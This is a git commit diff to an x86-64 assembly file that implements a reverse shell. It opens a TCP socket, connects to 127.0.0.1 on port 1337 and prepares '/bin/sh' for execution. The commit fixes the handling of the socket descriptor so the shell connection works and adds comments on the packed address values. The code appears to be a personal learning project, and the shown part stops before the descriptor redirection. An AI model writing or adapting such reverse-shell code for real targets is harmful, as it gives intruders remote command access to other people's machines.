d97de54e4df16a9cb4cb50dd0271e63e6d827e28
Sisek3375 <corvisiersimon6@gmail.com>
2025-05-13 21:55:17 +0200

    worked project

--- main.asm
+++ main.asm
@@ -1,19 +1,19 @@
 segment .bss
 	struc sockaddr	; struct for socket
 
-		sin_family: resw 1	; type IPv4
+		sin_family: resw 1	; AF_INET (IPv4)
 		sin_port: resw 1	; port
 		sin_addr: resd 1	; address
 
 	endstruc
 	
-segment .data
+segment .rodata
 	sockaddr_struct_init:
 
 		istruc sockaddr
-			at sin_family, dw 0x2
-			at sin_port, dw 0x3905
-			at sin_addr, dd 0x100007f
+			at sin_family, dw 0x2		; AF_INET (IPv4)
+			at sin_port, dw 0x3905		; port in little endian
+			at sin_addr, dd 0x0100007f	; IP in little endian
 		iend
 
 		binsh db "/bin/sh", 0
@@ -23,7 +23,7 @@ segment .text
 
 _start:
 	mov rax, 41	; syscall for socket
-	mov rdi, 2	; IPv4
+	mov rdi, 2	; AF_INET (IPv4)
 	mov rsi, 1	; TCP connexion
 	mov rdx, 6	; TCP protocol
 	syscall
@@ -34,11 +34,11 @@ _start:
 _connection:
 	mov rax, 42	; syscall for connexion
 	pop rdi		; recover the fd
+	push rdi
 	mov rsi, sockaddr_struct_init
 	mov rdx, 0x10	; address lengh
 	syscall
 
-	push rax
 	jmp _fd_stdin
 
 _fd_stdin:
